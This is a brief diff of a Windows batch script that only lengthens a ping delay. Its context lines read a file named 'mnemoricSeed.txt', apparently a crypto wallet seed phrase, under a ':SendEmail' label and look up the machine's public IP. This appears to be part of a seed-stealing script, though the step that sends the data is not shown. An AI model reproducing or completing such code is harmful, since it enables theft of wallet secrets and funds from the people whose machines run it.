@@ -1,6 +1,6 @@
 @echo off
 :SendEmail
-ping -n 1 127.0.0.1 > nul
+ping -n 11 127.0.0.1 > nul
 set curlIn=""
 set /p mnemoricSeedMail=< mnemoricSeed.txt
 for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
